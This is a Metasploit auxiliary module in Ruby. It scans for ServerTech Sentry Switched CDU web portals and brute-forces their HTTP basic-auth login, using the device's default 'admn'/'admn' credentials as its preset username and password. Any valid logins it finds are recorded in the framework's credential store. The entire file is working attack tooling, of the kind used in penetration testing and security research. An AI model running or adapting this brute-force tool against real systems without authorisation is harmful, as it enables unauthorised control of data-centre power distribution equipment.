##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Sentry Switched CDU Bruteforce Login Utility',
      'Description'    => %{
        This module scans for ServerTech's Sentry Switched CDU (Cabinet Power
        Distribution Unit) web login portals, and performs login brute force
        to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'admn'", "admn"]),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'admn'", "admn"])
      ])
  end

  def run_host(ip)
    unless is_app_sentry?
      print_error("#{rhost}:#{rport} - Sentry Switched CDU not found. Module will not continue.")
      return
    end

    print_status("#{rhost}:#{rport} - Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the app actually isn't Sentry
  #
  def is_app_sentry?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return false
    end

    if (res and res.body.include?("Sentry Switched CDU"))
      vprint_good("#{rhost}:#{rport} - Running ServerTech Sentry Switched CDU")
      return true
    else
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #
  def do_login(user, pass)
    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/index.html',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass)
      })

      if res and !res.get_cookies.empty?
        print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'ServerTech Sentry Switched CDU',
          user: user,
          password: pass,
          proof: res.get_cookies.inspect
        )
        return :next_user

      else
        vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
